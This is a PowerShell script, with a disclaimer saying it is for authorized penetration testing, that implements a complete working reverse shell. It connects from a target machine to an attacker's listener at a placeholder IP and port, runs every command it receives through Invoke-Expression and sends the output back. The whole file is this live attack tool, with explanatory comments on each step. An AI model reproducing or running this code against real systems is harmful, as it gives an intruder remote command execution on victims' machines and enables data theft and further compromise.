<#
.SYNOPSIS
    Establishes a basic PowerShell reverse shell connection to a specified attacker IP and port.

.DESCRIPTION
    This script creates an outbound TCP connection from the target machine to a listener
    on the attacker's machine. Once connected, it provides an interactive shell,
    allowing the attacker to execute PowerShell commands on the target and receive output.
    This variant uses System.IO.StreamWriter for sending data back to the attacker.

.PARAMETER AttackerIP
    The IP address of the attacker's machine where the Netcat listener is running.
    (Placeholder: "10.10.10.10")

.PARAMETER AttackerPort
    The port number on the attacker's machine that the Netcat listener is listening on.
    (Placeholder: 4444)

.NOTES
    Author: Perunchess
    Disclaimer: For educational and authorized penetration testing purposes only.
                Do not use on systems without explicit, written permission.
                This script will likely be detected by Antivirus/EDR solutions due to its functionality.
#>

# --- Configuration ---
# Define the attacker's IP address and listening port.
# IMPORTANT: Replace "10.10.10.10" with your actual attacker IP and 4444 with your chosen port.
$AttackerIP = "10.10.10.10";
$AttackerPort = 4444;

# --- Establish TCP Connection ---
try {
    # Create a new TCP client object to connect to the attacker.
    # This initiates the outbound connection from the target to the attacker.
    $client = New-Object System.Net.Sockets.TcpClient($AttackerIP, $AttackerPort);
    
    # Get the network stream from the established TCP connection.
    # This stream is used for sending and receiving raw data (bytes).
    $stream = $client.GetStream();
    
    # Create a StreamWriter object to easily send text data (strings) over the stream.
    # StreamWriter handles character encoding (ASCII in this case) and buffering.
    $writer = New-Object System.IO.StreamWriter($stream);
    
    # Create a byte array buffer to temporarily store incoming data from the attacker.
    # A size of 1024 bytes is common for network buffers.
    $buffer = New-Object byte[] 1024;
    
    # Create an ASCIIEncoding object to convert bytes received from the attacker into readable strings.
    $encoding = New-Object System.Text.ASCIIEncoding;

    # --- Interactive Shell Loop ---
    # This loop continuously reads commands from the attacker, executes them, and sends back the output.
    # The loop continues as long as data is being read from the stream ($i -ne 0).
    while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { 
        # Decode the incoming bytes from the attacker into a string command.
        # $data will contain the command sent by the attacker (e.g., "whoami", "dir").
        $data = $encoding.GetString($buffer, 0, $i); 
        
        # Execute the received command using Invoke-Expression (iex).
        # 2>&1 redirects standard error (stream 2) to standard output (stream 1),
        # ensuring both command output and errors are captured.
        # Out-String converts the entire output into a single string.
        $sendback = (Invoke-Expression $data 2>&1 | Out-String); 
        
        # Send the command's output back to the attacker using the StreamWriter.
        # WriteLine appends a newline character, making output easier to read on the attacker's side.
        $writer.WriteLine($sendback); 
        
        # Flush the writer's buffer to ensure all data is immediately sent over the network.
        $writer.Flush(); 
    }
}
catch {
    # Catch any errors that occur during connection establishment or within the loop.
    # This provides basic error handling, preventing the script from crashing silently.
    Write-Host "An error occurred during reverse shell execution: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # --- Connection Cleanup ---
    # This block ensures that the client connection is properly closed, regardless of whether
    # the try block completed successfully or an error occurred.
    if ($client -ne $null) {
        $client.Close(); # Close the TCP connection.
        Write-Host "Reverse shell connection closed." -ForegroundColor Red
    }
}
